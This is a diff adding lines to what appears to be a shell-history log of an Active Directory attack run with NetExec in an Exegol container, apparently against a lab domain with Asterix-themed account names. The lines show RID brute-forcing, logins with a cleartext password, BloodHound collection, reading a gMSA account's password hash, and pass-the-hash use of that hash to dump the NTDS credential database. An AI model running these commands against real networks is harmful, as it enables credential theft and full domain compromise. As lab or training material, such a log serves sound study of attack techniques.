@@ -39,3 +39,6 @@ nxc smb hosts.txt  -u guest -p '' --rid-brute 10000 --log rid-brute.txt
 [Jul 07, 2024 - 13:01:48 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5  -u alambix -p 'gaulois-x-toujours'                   
 [Jul 07, 2024 - 13:01:53 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k 
 [Jul 07, 2024 - 13:06:49 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k --bloodhound --dns-server 10.0.0.5 -c All  
+[Jul 07, 2024 - 13:02:09 (CEST)] exegol-netexec (netexec) /workspace # nxc ldap 10.0.0.5  -u alambix -p 'gaulois-x-toujours'  -k --gmsa
+[Jul 07, 2024 - 13:08:44 (CEST)] exegol-netexec (netexec) /workspace # nxc smb 10.0.0.5 -u 'gMSA-obelix$' -H 99bc5b63d68cb72b910bd754af32a236 --ntds
+
